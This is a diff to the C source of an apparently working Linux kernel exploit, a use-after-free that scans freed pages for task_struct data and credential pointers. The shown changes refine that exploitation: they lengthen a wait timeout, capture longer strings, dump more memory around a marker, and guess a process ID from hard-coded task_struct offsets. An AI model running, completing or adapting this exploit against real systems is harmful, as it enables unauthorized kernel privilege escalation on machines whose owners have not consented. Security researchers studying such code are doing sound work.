@@ -98,13 +98,16 @@ static int find_cred_pointers_near_comm(int fd, uint64_t task_va, uint8_t *task_
                                        uint64_t *out_cred_ptr, uint64_t *out_real_cred_ptr);
 static uint64_t get_kernel_base(void);
 #define WAIT_STEP_US 1000
-#define WAIT_TIMEOUT_MS 180000
+#define WAIT_TIMEOUT_MS 300000
 
 static int wait_for_flag_u8(volatile uint8_t *ptr, uint8_t value, unsigned int timeout_ms)
 {
     unsigned int waited = 0;
     while (*ptr != value && waited < timeout_ms)
     {
+        if (waited % 10000 == 0 && waited > 0) {
+            fprintf(stderr, "[WAIT] Still waiting for flag (0x%x), elapsed: %u ms\n", value, waited);
+        }
         usleep(WAIT_STEP_US);
         waited += WAIT_STEP_US / 1000;
     }
@@ -1651,7 +1654,7 @@ static int analyze_uaf_page(uint8_t *data, uint64_t va) {
     int strings = 0;
     int first_kptr_off = -1;
     int marker_off = -1;
-    char found_str[16] = {0};
+    char found_str[64] = {0};
     
     for (int i = 0; i < 512; i++) {
         uint64_t val = ((uint64_t*)data)[i];
@@ -1661,18 +1664,18 @@ static int analyze_uaf_page(uint8_t *data, uint64_t va) {
         }
     }
     
-    for (int i = 0; i < 4096 - 8; i++) {
-        if (memcmp(data + i, MARKER_NAME, 8) == 0) {
+    for (int i = 0; i < 4096 - 4; i++) {
+        if (i < 4096 - 8 && memcmp(data + i, MARKER_NAME, 8) == 0) {
             marker_off = i;
         }
         if (data[i] >= 0x20 && data[i] <= 0x7e) {
             int len = 0;
-            while (i + len < 4096 && data[i+len] >= 0x20 && data[i+len] <= 0x7e && len < 15) len++;
+            while (i + len < 4096 && data[i+len] >= 0x20 && data[i+len] <= 0x7e && len < 63) len++;
             if (len >= 4) {
                 strings++;
                 if (found_str[0] == 0) {
-                    memcpy(found_str, data + i, len > 15 ? 15 : len);
-                    found_str[len > 15 ? 15 : len] = '\0';
+                    memcpy(found_str, data + i, len);
+                    found_str[len] = '\0';
                 }
                 i += len;
             }
@@ -1683,17 +1686,34 @@ static int analyze_uaf_page(uint8_t *data, uint64_t va) {
         fprintf(stderr, "\n[DATA] VA:0x%lx | K-PTRs:%d | STRs:%d | MarkerOff:0x%x | Sample:\"%s\"", 
                 (unsigned long)va, kptrs, strings, marker_off, found_str);
         
+        // Detailed analysis of pointers
+        if (kptrs > 20) {
+            fprintf(stderr, "\n      [ANALYSIS] High K-PTR density! Possible task_struct or thread_info.");
+        }
+
         if (marker_off != -1) {
+            fprintf(stderr, "\n      [MARKER] Found %s at offset 0x%x", MARKER_NAME, marker_off);
+            // Try to find PID/TGID around marker if it's a task_struct
+            // OFFSET_COMM is 0x818, OFFSET_PID is 0x650
+            int potential_pid_off = marker_off - (OFFSET_COMM - OFFSET_PID);
+            if (potential_pid_off >= 0 && potential_pid_off <= 4096 - 4) {
+                int pid = *(int*)(data + potential_pid_off);
+                if (pid > 0 && pid < 100000) {
+                    fprintf(stderr, "\n      [TASK] Potential PID %d at offset 0x%x", pid, potential_pid_off);
+                }
+            }
+            
             fprintf(stderr, "\n      DUMP around Marker (0x%x): ", marker_off);
-            int start = (marker_off & ~0xf) - 32;
+            int start = (marker_off & ~0xf) - 64;
             if (start < 0) start = 0;
-            for (int i = 0; i < 128 && start + i < 4096; i += 8) {
+            for (int i = 0; i < 256 && start + i < 4096; i += 8) {
                 if (i % 32 == 0) fprintf(stderr, "\n        0x%03x: ", start + i);
                 fprintf(stderr, "%016lx ", *(uint64_t*)(data + start + i));
             }
         } else {
             fprintf(stderr, "\n      DUMP 0x00: ");
-            for (int i = 0; i < 64; i += 8) {
+            for (int i = 0; i < 128; i += 8) {
+                if (i % 32 == 0 && i > 0) fprintf(stderr, "\n        0x%03x: ", i);
                 fprintf(stderr, "%016lx ", *(uint64_t*)(data + i));
             }
         }
